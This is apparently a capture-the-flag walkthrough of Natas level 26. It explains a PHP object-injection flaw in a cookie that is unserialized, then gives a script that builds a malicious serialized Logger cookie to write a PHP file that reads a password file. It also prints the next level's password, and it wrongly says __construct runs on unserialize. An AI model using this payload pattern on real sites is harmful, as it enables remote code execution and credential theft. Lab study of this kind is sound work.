# Natas-26

Its an application for drawing a line by providing the initial and final coordinates .

Looking at the source code .

```php
<?php
    session_start();
    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
        $imgfile="img/natas26_" . session_id() .".png"; 
        drawImage($imgfile); 
        showImage($imgfile);
        storeData();
    }  
?>
```

After drawing the image and showing the image the function storeData() is called . 

```php
function storeData(){
        $new_object=array();
        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }   
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }   
        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
```

all the input coordinates are stored in an array called $new_object . It checks then if there is a cookie by the name drawing else it creates an array called $drawing and adds the array $new_object to it . Then the $drawing gets serialized and stores it as a cookie .

And when we give the coordinates for another line. Since there is already a cookie called drawing .if (array_key_exists("drawing", $_COOKIE)) this condition would be satisfied so the cookie will be unserialized and the new coodrinates will be appended to this unserialized drawing array .

Since the cookies are being deserialised we can inject an object into it as one of the arrays and invoke a call to one of the magic functions in a class which has dangerous code .There is one such class called Logger()

```php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg; 
       function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                        
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
```

 Logger() has a __construct function which will be invoked when unserialized is called and the injected object is initialised . the Loggers __construct function creates a file and writes content to it. So all we need to do is create a .php file and write a php code to read files so that we can get the password for natas 27 . So we need to inject a Logger object with $this→logFile=’img/pwned.php’ and

 $this→initMsg= ‘<?php file_get_contents(’/etc/natas_webpass/natas27’)?>’ .

Code to create the malicious cookie .

```php
<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        $this->initMsg="flag\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
        $this->logFile = "/var/www/natas/natas26/img/pass.php";
    }
}

$o = new Logger();
print base64_encode(serialize($o));

?>
```

```
Username : natas27
Password : 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
```
